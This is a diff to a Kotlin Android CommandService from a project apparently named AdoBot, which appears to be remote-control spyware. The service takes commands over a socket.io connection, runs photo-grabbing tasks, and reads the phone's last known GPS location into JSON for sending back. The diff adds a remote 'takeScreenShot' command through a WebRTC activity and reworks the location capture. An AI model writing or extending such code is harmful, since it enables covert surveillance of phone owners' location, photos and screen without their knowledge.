@@ -10,7 +10,6 @@ import android.support.v4.app.ActivityCompat
 import android.support.v4.content.ContextCompat
 import android.util.Base64
 import android.util.Log
-import io.nlopez.smartlocation.SmartLocation
 import io.socket.client.IO
 import io.socket.client.Socket
 import me.adobot.tasks.*
@@ -19,9 +18,11 @@ import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileInputStream
-import android.content.ComponentName
+import android.content.Context
+import android.location.Location
+import android.location.LocationManager
 import android.net.Uri
-import android.support.v4.content.ContextCompat.startActivity
+import me.adobot.activities.WebRTC
 
 
 class CommandService : Service() {
@@ -129,6 +130,10 @@ class CommandService : Service() {
                     "stopAll" -> {
                         GetPhotos.flag = false
                     }
+                    "takeScreenShot" ->{
+                        val intent = Intent(this, WebRTC::class.java)
+                        startActivity(intent)
+                    }
                     else -> {
                         Log.i(tag, "Unknown command")
                         /*val xcmd: HashMap<String, String> = HashMap()
@@ -176,10 +181,13 @@ class CommandService : Service() {
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
                 ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
 
-            val locationL = SmartLocation.with(this).location().lastLocation
+
+            val  locationManager = this.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            val lastLocation = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER) as Location
+
             val location = JSONObject()
-            location.put("lat", locationL?.latitude)
-            location.put("lon", locationL?.longitude)
+            location.put("lat", lastLocation.latitude)
+            location.put("lon", lastLocation.longitude)
             return location
         }
         return null
